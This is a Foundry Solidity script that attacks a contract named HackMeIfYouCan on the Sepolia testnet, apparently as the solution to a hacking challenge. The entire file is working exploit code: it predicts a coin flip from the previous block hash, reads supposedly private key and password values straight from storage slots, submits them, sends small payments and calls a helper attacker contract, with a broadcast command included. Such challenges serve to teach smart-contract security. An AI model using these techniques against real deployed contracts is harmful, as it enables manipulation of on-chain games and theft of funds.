// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.0;

// forge script script/OneShot.s.sol:HackScript --rpc-url $SEPOLIA_RPC_URL -vvvv --private-key $PRIVATE_KEY --legacy --broadcast

import {Script, console} from "forge-std/Script.sol";
import {HackMeIfYouCan} from "../src/HackMeIfYouCan.sol";
import {Hacker} from "../src/Hacker.sol";

contract HackScript is Script {
    HackMeIfYouCan public toHack =
        HackMeIfYouCan(0x9D29D33d4329640e96cC259E141838EB3EB2f1d9);
    Hacker public hacker = Hacker(0xF2D7D554489284F81ac3f7aEb9010fF92030a3A2);
    uint256 FACTOR =
        6275657625726723324896521676682367236752985978263786257989175917;
    uint256 lastHash;

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        flip();

        hacker.addPoint();

        toHack.transfer(address(toHack), 1);

        sendKey();

        sendPassword();

        contribute();

        goTo();

        vm.stopBroadcast();
    }

    function flip() public payable returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        bool win = toHack.flip(side);
        return win;
    }

    function sendKey() public {
        // ✅
        uint startSlot = 16; // 4 + 12
        bytes32 key = vm.load(address(toHack), bytes32(startSlot));
        toHack.sendKey(bytes16(key));
    }

    function sendPassword() public {
        // ✅
        uint startSlot = 3;
        bytes32 password = vm.load(address(toHack), bytes32(startSlot));
        toHack.sendPassword(password);
    }

    function contribute() public {
        // ✅
        toHack.contribute{value: 0.00001 ether}();
        address(toHack).call{value: 0.00001 ether}("");
    }

    function goTo() public {
        // ✅
        hacker.goTo(1);
    }
}
